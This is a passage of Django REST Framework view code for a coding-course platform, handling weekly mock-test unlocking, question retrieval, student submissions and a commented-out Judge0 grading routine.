                # print("week", i, pre_week_max_score)
                pre_weektotal_att = 0
                pre_week_max_score = 0
        """
        pre_week_db_max_attempt
        pre_week_db_max_score
        """
        # this week max_score
        # this_week_max_score_list = list(CompilerQuestionAtempt.objects.filter(student_id=std_id[0], question__practice_mock = True, question__course_id = course_id,  question__week=str(i)).values_list("score", flat=True))
        # # print(this_week_max_score_list)
        # if len(this_week_max_score_list) == 0:
        #     this_week_max_score = 0
        # else:
        #     this_week_max_score = max(this_week_max_score_list)
        
        # pre_week max_score
        # pre_week_max_score_list = list(CompilerQuestionAtempt.objects.filter(student_id=std_id[0], question__practice_mock = True, question__course_id = course_id,  question__week=str(i-1)).values_list("score", flat=True))
        # # print(pre_week_max_score_list)
        # if len(pre_week_max_score_list) == 0:
        #     pre_week_max_score = 0
        # else:
        #     pre_week_max_score = max(pre_week_max_score_list)
        """
        this_week_max_score
        pre_week_max_score
        """
        
        #pre week max score
        this_week_max_attempt_list = QuestionTimer.objects.filter(exam_field='Mock', course_id=course_id, week=str(i)).values("max_num_of_attempts", "week_pass_percent")
        if len(this_week_max_attempt_list) == 0:
            this_week_db_max_pass_score = 0
            this_week_db_max_pass_attempt = 0
        else:
            this_week_db_max_pass_score = this_week_max_attempt_list[0]["week_pass_percent"]
            this_week_db_max_pass_attempt = this_week_max_attempt_list[0]["max_num_of_attempts"]
        """
        total_complted_question
        total_attempt
        total_question
        pre_week_db_max_attempt
        pre_week_db_max_score
        this_week_max_score
        pre_week_max_score
        this_week_db_max_pass_score
        this_week_db_max_pass_attempt
        """

        append_data = {
            "name": course_name,
            "img": f"/images/Practice/week{i}.svg",
            "db_max_score": this_week_db_max_pass_score,
            "max_score": this_week_max_score,
            "total_attempt":total_attempt,
            "completed": total_complted_question,
            "total": total_question,
            "max_attempt": this_week_db_max_pass_attempt,
            "condition":""
            }
        if i == 1:
            if c_week >= 1 and total_question !=0:
                if total_attempt >= this_week_db_max_pass_attempt:
                    # print("hit2")
                    append_data["week"] = i
                    append_data["status"] = "Start Now"
                    append_data["isDisabled"] = False
                    append_data["condition"] = "You maximum attempts have completed, please reach out to the support team to unlock this"
                    main_data.append(append_data)
                if 1 <= total_attempt < this_week_db_max_pass_attempt:
                    # print("hit1")
                    append_data["week"] = i
                    append_data["status"] = "Retake"
                    append_data["isDisabled"] = False
                    append_data["condition"] = ""
                    main_data.append(append_data)
                if total_attempt == 0:
                    append_data["week"] = i
                    append_data["status"] = "Start Now"
                    append_data["isDisabled"] = False
                    append_data["condition"] = ""
                    main_data.append(append_data)
            elif c_week >= 1 and total_question ==0:
                append_data["week"] = i
                append_data["status"] = "Start Now"
                append_data["isDisabled"] = False
                append_data["condition"] = "Reach out to support team to unlock this"
                main_data.append(append_data)
            else:
                append_data["week"] = i
                append_data["status"] = "Lock"
                append_data["isDisabled"] = True
                append_data["condition"] = f"Week {i} Classes are Not Completed"
                main_data.append(append_data)
            # print(main_data)
        else:
            if c_week >= i:
                # print("week", i, "total_question", total_question, "pre_week_max_score", pre_week_max_score, "pre_week_db_max_score", pre_week_db_max_score)
                if total_question ==0:
                    if pre_week_max_score < pre_week_db_max_score:
                        append_data["week"] = i
                        append_data["status"] = "Lock"
                        append_data["isDisabled"] = False
                        append_data["condition"] = f"Please achieve min {pre_week_db_max_score}% from previous week to unlock this"
                        main_data.append(append_data)
                    else:
                        append_data["week"] = i
                        append_data["status"] = "Start Now"
                        append_data["isDisabled"] = False
                        append_data["condition"] = "Reach out to support team to unlock this"
                        main_data.append(append_data)
                elif pre_week_max_score >= pre_week_db_max_score and total_question !=0:
                    if total_attempt >= this_week_db_max_pass_attempt:
                        append_data["week"] = i
                        append_data["status"] = "Start Now"
                        append_data["isDisabled"] = False
                        append_data["condition"] = "You maximum attempts have completed, please reach out to the support team to unlock this"
                        main_data.append(append_data)
                    if total_attempt == 0:
                        append_data["week"] = i
                        append_data["status"] = "Start Now"
                        append_data["isDisabled"] = False
                        append_data["condition"] = ""
                        main_data.append(append_data)
                    if 1 <= total_attempt < this_week_db_max_pass_attempt:
                        append_data["week"] = i
                        append_data["status"] = "Retake"
                        append_data["isDisabled"] = False
                        append_data["condition"] = ""
                        main_data.append(append_data)
                elif pre_week_max_score < pre_week_db_max_score:
                    append_data["week"] = i
                    append_data["status"] = "Lock"
                    append_data["isDisabled"] = False
                    append_data["condition"] = f"Please achieve min {pre_week_db_max_score}% from previous week to unlock this"
                    main_data.append(append_data)
            else:
                append_data["week"] = i
                append_data["status"] = "Lock"
                append_data["isDisabled"] = True
                append_data["condition"] = f"Week {i} Classes are Not Completed"
                main_data.append(append_data)
    return main_data


#mock okay
class StudentallMockWeekLock(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)

    def get(self, request):
        user_id = request.user.id
        course_id = request.GET.get("course_id")
        std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
        get_batch = list(Batch.objects.filter(students__id__in=std_id, course_id=course_id).values_list("id", flat=True))
        if len(get_batch) == 0:
            return Response({"main_data": "No Batch"})
        # get_batch = [37]
        batch_time_table = TimeTable.objects.filter(batch_id=get_batch[0]).values("start_date", "start_time", "week")
        completed_classes = get_completed_days(batch_time_table)
        c_week = int(len(completed_classes) / 3)
        course_name = Course.objects.filter(id=course_id).values("name")[0]["name"]

        try:
            total_week = Course.objects.filter(id=course_id).values("course_duration")[0]["course_duration"]
        except:
            total_week = 8

        main_data = mock_week_unlock(std_id, total_week, course_id, course_name, c_week)

        
        
        # result = []
        for ft in range(1, len(main_data)+1):
            # print(ft)
            main_di = main_data[ft-1]
            week_first_questions = mock_week_first_questions(course_id, str(ft))
            main_di.update(week_first_questions)
            # result.append(main_di)
        # print(result)
        #filter mock week result with Avarage Score
           
        week_id = request.GET.get("week_id")
        if week_id is not None:
            corrent_attempt_num_list = MockResult.objects.filter(week=int(week_id), Course_id=course_id, student_id=std_id[0]).last()
            corrent_attempt_num = corrent_attempt_num_list.attempt
            score_list = list(MockResult.objects.filter(attempt=corrent_attempt_num, week=int(week_id), Course_id=course_id, student_id=std_id[0]).values_list("score", flat=True))
            correct_ans = score_list.count(100)
            try:
                this_attm_max_score = (100*correct_ans)/len(score_list)
            except:  
                this_attm_max_score = 0
            week_result = []
            for i in main_data:
                if i["week"] == int(week_id):
                    result_obj = {
                        "week":int(week_id),
                        "total_attempt":corrent_attempt_num,
                        "total": len(score_list),
                        "correct_answer": correct_ans,
                        "wrong_answer": int(len(score_list) - correct_ans),
                        "max_score": int(this_attm_max_score),
                        "db_max_score":i["db_max_score"]
                        }
                    week_result.append(result_obj)
            return Response({"week_result":week_result})
        return Response({"main_data": main_data})

# #mock
# class StudentallMockQuestionAll(ListAPIView):  #30/01/2024
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
#     def get(self, request):
#         try :
#             user_id = request.user.id
#             course_id = request.GET.get("course_id")
#             week_id = request.GET.get("week_id")
#             get_q = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=True,disable= False).order_by("day")
#             main_data = []
#             # topics = []
#             j =1
#             for i in get_q:
#                 q_status= compiler_question_all_mock(user_id,i.id,course_id)
#                 slg =i.ques_title.replace(" ", "-")
#                 main_data.append({"id":i.id,"q_id":j,"name":f"day{i}","active":True,"topics":{"q_id":i.id,"title":i.ques_title,"slg":slg,"isOnGoing":True, "que_status":q_status}})
#                 j+=1
#             print(main_data)
#             return Response({"main_data":main_data}, status=status.HTTP_200_OK)
#         except Exception as e :
#             return Response({"error":f"{e}"})

# mock
# changed
class StudentallMockQuestionAll(ListAPIView):  #30/01/2024
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try :
            user_id = request.user.id
            course_id = request.GET.get("course_id")
            week_id = request.GET.get("week_id")
            get_q = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=True,disable= False).order_by("day")
            main_data = []
            # topics = []
            j =1
            for i in get_q:
                # q_status= compiler_question_all_mock(user_id,i.id,course_id)
                slg =i.ques_title.replace(" ", "-")
                # main_data.append({"id":i.id,"q_id":j,"name":f"day{i}","active":True,"topics":{"q_id":i.id,"title":i.ques_title,"slg":slg,"isOnGoing":True, "que_status":q_status}})
                main_data.append({"id":i.id,"q_id":j,"name":f"day{i}","active":True,"topics":{"q_id":i.id,"title":i.ques_title,"slg":slg,"isOnGoing":True}})
                j+=1
            print(main_data)
            return Response({"main_data":main_data}, status=status.HTTP_200_OK)
        except Exception as e :
            return Response({"error":f"{e}"})



#mock
class StudentallMockQuestion(ListAPIView):  #30/01/2024
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try:
            main_data = []
            user_id = request.user.id
            q_id = request.GET.get("q_id")
            get_q = CompilerQuestion.objects.filter(id=q_id,practice_mock=True,disable= False).order_by("question_number")
            #next_questions
            get_c_q = CompilerQuestion.objects.filter(id=q_id, practice_mock=True,disable= False).values("week", "course_id")
            if len(get_c_q) != 0:
                week_id = int(get_c_q[0]["week"])
                course_id = int(get_c_q[0]["course_id"])
                get_all_q_id = list(CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=True,disable= False).values_list("id", flat=True))
                # next_q_id = find_next_number(get_all_q_id.copy(), int(q_id))
                next_q_id = get_next_index(get_all_q_id, int(q_id))
            #end
            get_course = CompilerQuestion.objects.get(id=q_id, practice_mock=True,disable= False)
            get_course.course.name if get_course.course else None
            socialSitList = []
            examples = []
            test_case_list = []

            for i in get_q :
                if i.google :
                    socialSitList.append("Google") 
                if i.amazon :
                    socialSitList.append("Amazon")
                if i.microsoft :
                    socialSitList.append("Microsoft")
                if i.meta :
                    socialSitList.append("Facebook")
                if i.linkedin :
                    socialSitList.append("Linkedin")
                if i.uber :
                    socialSitList.append("Uber")
                if i.adobe :
                    socialSitList.append("Adobe")
                if i.cred :
                    socialSitList.append("Cred")
                #testcases
                test_cases = i.test_cases
                if test_cases == {}:
                    test_casess = []
                else:
                    test_casess = test_cases["data"]
                # print(test_casess)
                # if i.test_case is not None and len(i.test_case) != 0:
                #     if i.test_case != "null":
                #         try:
                #             test_case_txt = str(i.test_case).split("\r\n\r\n\r\n")
                #             t_counter = 0
                #             for case_ in test_case_txt:
                #                 t_counter += 1
                #                 caa = str(case_).replace("\r", "").replace("\n", "")
                #                 caaa = caa.split("||")
                #                 case_titel = caaa[0]
                                
                #                 # Split the parts and handle index out of range
                #                 test_case_parts = caaa[1].split("=")
                #                 test_case_titel = test_case_parts[0] + "=" if len(test_case_parts) > 1 else None
                #                 test_case_value = test_case_parts[1] if len(test_case_parts) > 1 else None

                #                 target_parts = caaa[2].split("=")
                #                 target_titel = target_parts[0] + "=" if len(target_parts) > 1 else None
                #                 target_value = target_parts[1] if len(target_parts) > 1 else None

                #                 expected_parts = caaa[3].split("=")
                #                 expected_titel = expected_parts[0] + "=" if len(expected_parts) > 1 else None
                #                 expected_value = expected_parts[1] if len(expected_parts) > 1 else None

                #                 test_case_list.append({
                #                     "id": t_counter,
                #                     "case_titel": case_titel,
                #                     "test_case_titel": test_case_titel,
                #                     "test_case_value": test_case_value,
                #                     "target_titel": target_titel,
                #                     "target_value": target_value,
                #                     "expected_titel": expected_titel,
                #                     "expected_value": expected_value
                #                 })
                #         except:
                #             test_case_list.append({
                #                     "info":"Please follow The Process"
                #                 })
                #examples
                exampless = str(i.examples)
                lines = exampless.strip().split('\n')
                exampless_list = []
                for line in lines:
                    line = line.strip()  # Remove leading and trailing spaces
                    if line.startswith("Sample Eg") and "||" in line:
                        exampless_list.append(line)
                counter = 0
                for j in exampless_list:
                    ex = str(j).replace("\r","").replace("\n","")
                    exx = ex.split("||")
                    title = exx[0]
                    input = exx[1]
                    output = exx[2]
                    explanation = exx[3]
                    examples.append({"id":counter+1,"title":title,"input":input,"output":output,"explanation":explanation})
                    counter +=1

                # constrains
                constrain =[]    
                if i.constraints is not None and len(i.constraints) != 0:
                    try:
                        cons_txt = str(i.constraints).split("\r\n\r\n\r\n")
                        con_counter = 0
                        for con in cons_txt:
                            con_counter += 1
                            conss = str(con).replace("\r", "").replace("\n", "")
                            nw_cons = conss.split("||")
                            cons_title = nw_cons[0]
                            cons_value = nw_cons[1]
                            constrain.append({"constrain_title":cons_title,"constrain_value":cons_value})
                    except:
                        constrain.append({
                                    "info":"Please follow The Process"
                                })         
                # video solutions
                all_videos =[]    
                if i.video_solutions is not None and len(i.video_solutions) != 0:
                    try:
                        vids = str(i.video_solutions).split("\r\n\r\n\r\n")
                        vid_counter = 0
                        for v in vids:
                            vid_counter += 1
                            vidd = str(v).replace("\r", "").replace("\n", "")
                            nw_vids = vidd.split("||")
                            vid_language = nw_vids[0]
                            vid_url = nw_vids[1]
                            all_videos.append({"video_title":vid_language,"video_links":vid_url})     
                    except:
                        all_videos.append({
                                    "info":"Please follow The Process"
                                }) 
                approch_values = compiler_question_approches_moock(q_id)   
                prob_pic = i.prob_pic.url if i.prob_pic else ""
                const_pic = i.const_pic.url if i.const_pic else "null"
                main_data.append({"next_q_id":next_q_id,"course_name": get_course.course.name,"problem_id":i.prob_id,"question_id":i.id,"question_number":i.question_number,"question_name":i.ques_title,"socialSitList":socialSitList,"prob_text":i.prob_text,
                                "prob_pic": prob_pic,"examples":examples,"constrains":constrain,"const_pic":const_pic,"Challenge":i.challenge,"video_solutions":all_videos,"test_case": test_casess ,"approch_values":approch_values})
            return Response({"main_data":main_data})  
        except Exception as e :
            return Response({"error":f"{e}"})

#mock
class MockQuestionSearchTitel(ListAPIView):  #30/01/2024
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request, q_titel):
        try:
            main_data = []
            user_id = request.user.id
            q_titel = q_titel.replace("-", " ")
            get_q = CompilerQuestion.objects.filter(ques_title=q_titel,practice_mock=True,disable= False).order_by("question_number")
            #next_questions
            get_c_q = CompilerQuestion.objects.filter(ques_title=q_titel, practice_mock=True,disable= False).values("week", "course_id", "id")
            if len(get_c_q) != 0:
                week_id = int(get_c_q[0]["week"])
                course_id = int(get_c_q[0]["course_id"])
                get_all_q_id = list(CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=True,disable= False).values_list("id", flat=True))
                q_id = get_c_q[0]["id"]
                # next_q_id = find_next_number(get_all_q_id.copy(), int(q_id))
                next_q_id = get_next_index(get_all_q_id, int(q_id))
                next_q_titel = CompilerQuestion.objects.filter(id=int(next_q_id), practice_mock=True,disable= False).values("ques_title")[0]["ques_title"]
                
            #end
            # print(q_titel)
            get_course = CompilerQuestion.objects.get(ques_title=q_titel, practice_mock=True,disable= False)
            get_course.course.name if get_course.course else None
            socialSitList = []
            examples = []
            test_case_list = []

            for i in get_q :
                if i.google :
                    socialSitList.append("Google") 
                if i.amazon :
                    socialSitList.append("Amazon")
                if i.microsoft :
                    socialSitList.append("Microsoft")
                if i.meta :
                    socialSitList.append("Facebook")
                if i.linkedin :
                    socialSitList.append("Linkedin")
                if i.uber :
                    socialSitList.append("Uber")
                if i.adobe :
                    socialSitList.append("Adobe")
                if i.cred :
                    socialSitList.append("Cred")
                #testcases
                test_cases = i.test_cases
                if test_cases == {}:
                    test_casess = []
                else:
                    test_casess = test_cases["data"]
                # print(test_casess)
                # if i.test_case is not None and len(i.test_case) != 0:
                #     if i.test_case != "null":
                #         try:
                #             test_case_txt = str(i.test_case).split("\r\n\r\n\r\n")
                #             t_counter = 0
                #             for case_ in test_case_txt:
                #                 t_counter += 1
                #                 caa = str(case_).replace("\r", "").replace("\n", "")
                #                 caaa = caa.split("||")
                #                 case_titel = caaa[0]
                                
                #                 # Split the parts and handle index out of range
                #                 test_case_parts = caaa[1].split("=")
                #                 test_case_titel = test_case_parts[0] + "=" if len(test_case_parts) > 1 else None
                #                 test_case_value = test_case_parts[1] if len(test_case_parts) > 1 else None

                #                 target_parts = caaa[2].split("=")
                #                 target_titel = target_parts[0] + "=" if len(target_parts) > 1 else None
                #                 target_value = target_parts[1] if len(target_parts) > 1 else None

                #                 expected_parts = caaa[3].split("=")
                #                 expected_titel = expected_parts[0] + "=" if len(expected_parts) > 1 else None
                #                 expected_value = expected_parts[1] if len(expected_parts) > 1 else None

                #                 test_case_list.append({
                #                     "id": t_counter,
                #                     "case_titel": case_titel,
                #                     "test_case_titel": test_case_titel,
                #                     "test_case_value": test_case_value,
                #                     "target_titel": target_titel,
                #                     "target_value": target_value,
                #                     "expected_titel": expected_titel,
                #                     "expected_value": expected_value
                #                 })
                #         except:
                #             test_case_list.append({
                #                     "info":"Please follow The Process"
                #                 })
                #examples
                exampless = str(i.examples)
                lines = exampless.strip().split('\n')
                exampless_list = []
                for line in lines:
                    line = line.strip()  # Remove leading and trailing spaces
                    if line.startswith("Sample Eg") and "||" in line:
                        exampless_list.append(line)
                counter = 0
                for j in exampless_list:
                    ex = str(j).replace("\r","").replace("\n","")
                    exx = ex.split("||")
                    title = exx[0]
                    input = exx[1]
                    output = exx[2]
                    explanation = exx[3]
                    examples.append({"id":counter+1,"title":title,"input":input,"output":output,"explanation":explanation})
                    counter +=1

                # constrains
                constrain =[]    
                if i.constraints is not None and len(i.constraints) != 0:
                    try:
                        cons_txt = str(i.constraints).split("\r\n\r\n\r\n")
                        con_counter = 0
                        for con in cons_txt:
                            con_counter += 1
                            conss = str(con).replace("\r", "").replace("\n", "")
                            nw_cons = conss.split("||")
                            cons_title = nw_cons[0]
                            cons_value = nw_cons[1]
                            constrain.append({"constrain_title":cons_title,"constrain_value":cons_value})
                    except:
                        constrain.append({
                                    "info":"Please follow The Process"
                                })         
                # video solutions
                all_videos =[]    
                if i.video_solutions is not None and len(i.video_solutions) != 0:
                    try:
                        vids = str(i.video_solutions).split("\r\n\r\n\r\n")
                        vid_counter = 0
                        for v in vids:
                            vid_counter += 1
                            vidd = str(v).replace("\r", "").replace("\n", "")
                            nw_vids = vidd.split("||")
                            vid_language = nw_vids[0]
                            vid_url = nw_vids[1]
                            all_videos.append({"video_title":vid_language,"video_links":vid_url})     
                    except:
                        all_videos.append({
                                    "info":"Please follow The Process"
                                }) 
                approch_values = compiler_question_approches_moock(q_id)   
                prob_pic = i.prob_pic.url if i.prob_pic else "null"
                const_pic = i.const_pic.url if i.const_pic else "null"
                main_data.append({"next_q_id":next_q_id,"next_q_titel":next_q_titel.replace(" ", "-"), "course_name": get_course.course.name,"problem_id":i.prob_id,"question_id":i.id,"question_number":i.question_number,"question_name":i.ques_title,"socialSitList":socialSitList,"prob_text":i.prob_text,
                                "prob_pic": prob_pic,"examples":examples,"constrains":constrain,"const_pic":const_pic,"Challenge":i.challenge,"video_solutions":all_videos,"test_case": test_casess ,"approch_values":approch_values})
            return Response({"main_data":main_data})  
        except Exception as e :
            return Response({"error":f"{e}"})

#mock
class StudentallMockQuestionSubmission(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    
    def post(self, request) :
        try :
            main_data = []
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            if len(std_id) > 0 :
                std_id = std_id[0]
            else:
                std_id = ""
            q_id = request.data.get("q_id")
            source_code = request.data.get("source_code")
            compiler = request.data.get("compiler")
            compiler_id = request.data.get("compiler_id")
            problem_id = request.data.get("problem_id")
            coding_language = request.data.get("coding_language")
            button_clicked = request.data.get("button_clicked")
            get_q = CompilerQuestion.objects.filter(id=q_id,practice_mock=True,disable= False)
            if get_q.exists() and std_id !="" and source_code and compiler_id and problem_id and coding_language and button_clicked :
                get_q = get_q.first()
                check_temp = CompilerQuestionLoadTemplate.objects.filter(compiler=compiler)
                if check_temp.exists():
                    get_temp = check_temp.first()
                    load_template_id = get_temp.id
                    coding_language = coding_language
                else:
                    return Response({"main_data":main_data})
                attepmt_number = CompilerQuestionAtempt.objects.filter(question_id=q_id,student_id=std_id,load_template_id=load_template_id,
                                                                    coding_language=coding_language,button_clicked="Run")
                if attepmt_number.exists():
                    get_attepmt_temp = attepmt_number.first()
                    get_attepmt_temp.student_ans = source_code
                    get_attepmt_temp.button_clicked = button_clicked
                    get_attepmt_temp.save()
                    main_data = get_attepmt_temp.id
                else:
                    get_attepmt_temp = CompilerQuestionAtempt(question_id=q_id,student_id=std_id,load_template_id=load_template_id,
                                        coding_language=coding_language,student_ans=source_code,button_clicked=button_clicked)
                    get_attepmt_temp.save()
                    main_data = get_attepmt_temp.id
            return Response({"main_data":main_data})
        except Exception as e :
            return Response({"error":f"{e}"})


#mock
class StudentallMockQuestionSubmissionAll(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    
    def post(self, request) :
        # try :
        user_id = request.user.id
        std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
        all_q_list = request.data.get("all_q_list")
        current_week = None
        for check_ in all_q_list:
            student_id = std_id[0]
            question_id = check_
            course_id = CompilerQuestion.objects.filter(id=check_, disable= False).values("course_id")[0]["course_id"]
            week = int(CompilerQuestion.objects.filter(id=check_, disable= False).values("week")[0]["week"])
            if not current_week:
                current_week = week
            # question_submit = CompilerQuestionAtempt.objects.filter(question__id = check_, question__week=str(week), student_id=std_id[0], submited=True)
            question_submit = MockResult.objects.filter(week=week, Course_id=course_id, student_id=student_id, question_id=check_).values("attempt")
            print(question_submit.values())
            if question_submit:
                pre_att = question_submit.order_by("-id")
                pre_at = pre_att.values()[0]
                print("jsefhbjdshkgjf",pre_at["attempt"])
                attempt = int(pre_at["attempt"])+1
            else:
                attempt = 1

            new_question_submit = CompilerQuestionAtempt.objects.filter(question_id = check_, student_id=std_id[0], submited=False)
            if new_question_submit:
                score_detsils = []
                for k in new_question_submit:
                    dd = CompilerQuestionAtempt.objects.filter(id=k.id)
                    score_detsils.append(dd.values("score")[0]["score"])
                    dd.update(attepmt_number=attempt, submited=True, button_clicked="Submit")
                    del_code = SavePracticeCode.objects.filter(question_id=check_, student_id=std_id[0])
                    for kl in del_code:
                        d_id = kl.id
                        SavePracticeCode.objects.filter(id=d_id).delete()
                if len(score_detsils) != 0:
                    max_score = max(score_detsils)
                else:
                    max_score = 0
                
                MockResult.objects.create(attempt = attempt,question_id = check_,student_id = student_id, Course_id = course_id, score = int(max_score), correct=True, week = week)
                # if max_score == 100:
                #     MockResult.objects.create(attempt = attempt,question_id = check_,student_id = student_id, Course_id = course_id, score = 100, correct=True, week = week)
                # else:
                #     MockResult.objects.create(attempt = attempt,question_id = check_, student_id = student_id, Course_id = course_id, score = 0, week = week)

            else:
                MockResult.objects.create(attempt = attempt, question_id = check_, student_id = student_id, Course_id = course_id, score = 0, week = week)
                CompilerQuestionAtempt.objects.create(question_id = check_, student_id=std_id[0], attepmt_number=attempt, submited=True, button_clicked="Submit")
                del_code = SavePracticeCode.objects.filter(question_id=check_, student_id=std_id[0])
                for kl in del_code:
                    d_id = kl.id
                    SavePracticeCode.objects.filter(id=d_id).delete()

        # Notification part
        course = Course.objects.filter(id=course_id).first()
        question_timer = QuestionTimer.objects.filter(exam_field="Mock", course=course, week=current_week).first()
        attempt = MockResult.objects.filter(student__user_id=user_id, week=week, Course=course).last().attempt
        total_q = CompilerQuestion.objects.filter(course =course, week=week, practice_mock=True,disable= False).count()
        score, total_compl_ques  = wee_max_score(week, course.id, attempt, std_id[0], total_q)
        if score >= question_timer.week_pass_percent and not course.course_duration == week:
            title = f'Next Mock Unlock'
            current_date = datetime.now().strftime("%d-%m-%Y")
            if week:
                week_value = int(week) +1
                message = f"Your {course.name}'s Week - {week_value} mock test is unlocked.\nDate : {current_date}"
                notify_user(request.user.id, title, message)
        return Response({"status":True, "message":"Questions Sumited Successfully"})
    
        # except Exception as e :
        #     return Response({"error":f"{e}"})



        

# class StudentallMockQuestionSubmissionResponce(APIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)

#     def get(self, request):
#         try:
#             main_data = []
#             user_id = request.user.id
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
#             if len(std_id) > 0:
#                 std_id = std_id[0]
#             else:
#                 std_id = ""
#             api_result = []
#             main_data_id = request.GET.get("main_data_id")
#             check_ans = CompilerQuestionAtempt.objects.filter(id=main_data_id)
#             if check_ans.exists():
#                 get_ans = check_ans.first()
#                 student_id = get_ans.student.id
#                 ques_id = get_ans.question.id
#                 ques_name = get_ans.question.ques_title
#                 prob_id = get_ans.question.prob_id
#                 source_code = get_ans.student_ans
#                 compiler = get_ans.load_template.compiler.split("||")
              
#                 triple_quoted_string = '''{}'''.format(source_code)
#                 compiler_id = compiler[1]
                
                
#                 if isinstance(get_ans.question.test_cases_to_pass, str):
#                     test_cases = json.loads(get_ans.question.test_cases_to_pass)['data']
#                 else:
#                     test_cases = get_ans.question.test_cases_to_pass['data']

#                 url = 'https://judge0-ce.p.rapidapi.com/submissions/batch'
#                 headers = {
#                     'Content-Type': 'application/json',
#                     'x-rapidapi-host': "judge0-ce.p.rapidapi.com",
#                     'x-rapidapi-key': RAPID_API_KEY  # Replace with your RapidAPI key
#                 }

#                 submissions = []

#                 def format_stdin(inputs, output):
#                     stdin = None
#                     expected_output = None
#                     for i in inputs:
#                         if not stdin:
#                             stdin = str(i["value"])
#                         else:
#                             stdin = stdin + f" {i["value"]}"
#                     for j in output:
#                         if not expected_output:
#                             expected_output = f"{j["value"]}\n"
                        
#                     return stdin, expected_output
                
#                 for test_case in test_cases:
#                     inputs = test_case["input"]
                    
#                     # num_tests = len(inputs) // len(inputs)  # Assuming each test case has two numbers
#                     # stdin = f"{num_tests}\n" + "\n".join([str(input['value']) for input in inputs])
#                     stdin, expected_output = format_stdin(inputs, test_case["expected"])
#                     # expected_output = "\n".join([str(exp['value']) for exp in test_case["expected"]]) + "\n"
#                     print(stdin)
#                     print(expected_output)
                    
#                     submissions.append({
#                         "language_id": compiler_id,
#                         "source_code": triple_quoted_string,
#                         "stdin": stdin,
#                         "expected_output": expected_output,
#                         "time_limit": 5,
#                         "memory_limit": 128000
#                     })

#                 payload_for_post = {
#                     "submissions": submissions
#                 }

#                 response = requests.post(url, headers=headers, json=payload_for_post)
                
#                 if response.status_code == 201:
#                     data = response.json()
#                     get_ans.code_response = data

#                     if isinstance(data, dict) and 'submissions' in data:
#                         batch_tokens = ','.join([sub['token'] for sub in data['submissions']])
#                     elif isinstance(data, list):
#                         batch_tokens = ','.join([sub['token'] for sub in data])
#                     else:
#                         raise ValueError("Unexpected data structure in API response")

#                     time.sleep(3)
#                     batch_result = get_batch_result(batch_tokens)
#                     print(batch_result)
#                     for i, result in enumerate(batch_result['submissions']):   
#                         test_case = test_cases[i]
#                         res_da = {
#                             "number": i,
#                             "status": {
#                                 "code": result['status']['id'],
#                                 "name": result['status']['description']
#                             },
#                             "score": 0,
#                             "time": result.get('time', 0),
#                             "memory": result.get('memory', 0),
#                             "signal": 0,
#                             "signal_desc": ""
#                         }
#                         api_result.append(res_da)

#                     passed_tests = sum(1 for res in api_result if res['status']['code'] == 3)  # Assuming 'accepted' has status code 3
#                     total_tests = len(api_result)
                
#                     main_data_item = {
#                         'id': get_ans.id,
#                         'executing': False,
#                         'date': datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S +00:00'),
#                         'compiler': {
#                             'id': compiler_id,
#                             'name': compiler,
#                             'version': {
#                                 'id': None,
#                                 'name': None
#                             }
#                         },
#                         'problem': {
#                             'id': ques_id,
#                             'code': prob_id,
#                             'name': ques_name,
#                             'uri': ''
#                         },
#                         'result': {
#                             'score': (passed_tests / total_tests) * 100,
#                             'status': {
#                                 'code': 15 if passed_tests == total_tests else 11,
#                                 'name': 'Accepted' if passed_tests == total_tests else 'Wrong Answer'
#                                 # 'name': next((r['status']['description'] for r in batch_result["submissions"] if r['status']['description']), None)
#                             },
#                             'time': sum([float(r.get('time', 0)) if r.get('time') is not None else 0 for r in batch_result["submissions"]]),
#                             'memory': max([int(r.get('memory', 0)) if r.get('memory') is not None else 0 for r in batch_result["submissions"]] or [0]),
#                             'signal': 0,
#                             'signal_desc': '',
#                             'testcases': api_result
#                         },
#                         'uri': ''
#                     }
#                     main_data.append(main_data_item)

#                     get_ans.code_response = json.dumps({"items": main_data})
#                     get_ans.submissions_id = None
#                     result_data = []
#                     error_data = None
#                     for r in batch_result["submissions"]:
#                         if r.get("stdout") is not None:
#                             data = r.get("stdout").strip()
#                             result_data.append(data)
#                         elif r.get("stderr") is not None:
#                             error_data = r.get("stderr").strip()
#                             break
#                         elif r.get("compile_output") is not None:
#                             error_data = r.get("compile_output").strip()
#                             break
#                     get_ans.code_response_status = {"status":main_data[0]['result']['status']["name"], "data":result_data if len(result_data) > 0 else error_data }
#                     get_ans.status = True if main_data[0]['result']['status']['code'] == 15 else False
#                     get_ans.save()

#                     previous_attempts = CompilerQuestionAtempt.objects.filter(
#                         question_id=ques_id,
#                         student_id=student_id,
#                         question__practice_mock=True,
#                         submited=False,
#                         button_clicked="Submit"
#                     ).order_by("-id").values(
#                         "id", "status", "load_template__compiler", "student_ans", "practic_time", "code_response", "code_response_status"
#                     )
                    
#                     for ti in previous_attempts:
#                         if ti["code_response"] is not None:
#                             res = json.loads(ti["code_response"])
#                             ti["timer"] = res['items'][0]['result']["time"]
#                             ti["memory"] = res['items'][0]['result']["memory"]
#                             ti.update(ti["code_response_status"])
#                             del ti["code_response"]
#                             del ti["code_response_status"]
                    
#                     return Response({
#                         "main_data": {
#                             "items": main_data
#                         },
#                         "source_code": source_code,
#                         "previous_attempts": previous_attempts if previous_attempts else [],
#                         "api_result": get_ans.code_response_status
#                     })
#             else:
#                 return Response({"error": "Invalid main_data_id"})
#         except Exception as e:
#             return Response({"error": f"{e}"})


#changed
class StudentallMockQuestionSubmissionResponce(APIView):
